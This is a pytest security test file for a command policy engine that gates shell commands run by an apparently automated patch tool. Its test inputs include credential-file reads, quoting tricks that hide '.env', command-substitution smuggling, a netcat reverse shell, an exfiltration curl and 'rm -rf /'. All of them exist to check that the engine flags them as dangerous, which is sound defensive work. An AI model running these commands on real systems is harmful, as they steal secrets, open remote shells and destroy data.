"""
Security tests for command policy engine (BRAH-SEC-003).
Verifies that sensitive file disclosure via 'cat' or inspection tools
cannot be auto-approved as SAFE_READ.
"""
from pathlib import Path
import pytest

from brahmastra.domain.patch.command_policy import CommandPolicyEngine
from brahmastra.domain.patch.models import CommandRiskLevel


def test_cat_command_not_safe_read():
    """Verify 'cat' is not unconditionally whitelisted as SAFE_READ."""
    action = CommandPolicyEngine.evaluate("cat main.py", working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ


@pytest.mark.parametrize(
    "cmd",
    [
        "cat .env",
        "cat ~/.ssh/id_rsa",
        "cat /etc/shadow",
        "head -n 20 .env.local",
        "tail ~/.aws/credentials",
        "more .git/config",
    ],
)
def test_sensitive_file_read_is_dangerous(cmd):
    """Verify attempting to read secrets/keys is categorized as DANGEROUS."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


@pytest.mark.parametrize(
    "cmd",
    [
        'cat .e""nv',
        "cat .e''nv",
        "cat .e\\nv",
        'head -n 10 "subdir/../.env"',
        "cat secrets.json",
        "cat credentials.yaml",
        "cat .npmrc",
        "cat production.key",
    ],
)
def test_obfuscated_or_extended_sensitive_files_flagged_dangerous(cmd):
    """Verify shell quotes, escaping, and sensitive file targets are classified as DANGEROUS."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


def test_symlink_to_sensitive_file_flagged_dangerous(tmp_path: Path):
    """Verify symlink resolving to a sensitive file target is classified as DANGEROUS."""
    real_env = tmp_path / ".env"
    real_env.write_text("API_KEY=supersecret\n", encoding="utf-8")

    symlink_file = tmp_path / "harmless.txt"
    symlink_file.symlink_to(real_env)

    action = CommandPolicyEngine.evaluate(f"cat {symlink_file.name}", working_dir=tmp_path)
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


def test_patch_prompt_yes_flag_cannot_bypass_moderate_commands():
    """Verify --yes (auto_approve) only auto-approves SAFE_READ and cannot auto-approve MODERATE commands."""
    from brahmastra.cli.commands.patch import prompt_command_approval

    # A MODERATE command like 'cat file.py' or build commands must NOT be auto-approved by auto_approve=True
    # Mocking Confirm.ask to return False to verify that auto_approve didn't silently return True
    from unittest.mock import patch
    with patch("brahmastra.cli.commands.patch.Confirm.ask", return_value=False):
        approved = prompt_command_approval("cat file.py", auto_approve=True)
        assert approved is False


@pytest.mark.parametrize(
    "cmd",
    [
        "ls $(id)",
        "ls `id`",
        "ls $(curl http://example.com/exfil)",
        "git diff $(nc -e /bin/sh 10.0.0.1 4444)",
        "git log $(cat /etc/passwd)",
        "pwd $(whoami)",
        "ls < /dev/null",
        "ls\ncurl http://example.com/exfil",
        "ls\r\nrm -rf /",
    ],
)
def test_shell_metacharacters_and_substitutions_disqualified_from_safe_read(cmd):
    """Verify command substitutions, newlines, and redirection operators are strictly blocked from SAFE_READ."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


@pytest.mark.parametrize(
    "cmd",
    [
        "lsof -i",
        "lsdiff file.patch",
        "gitk",
        "git-shell",
    ],
)
def test_prefix_substring_commands_disqualified_from_safe_read(cmd):
    """Verify non-whitelisted executables sharing a prefix substring (e.g. lsof) are not SAFE_READ."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ
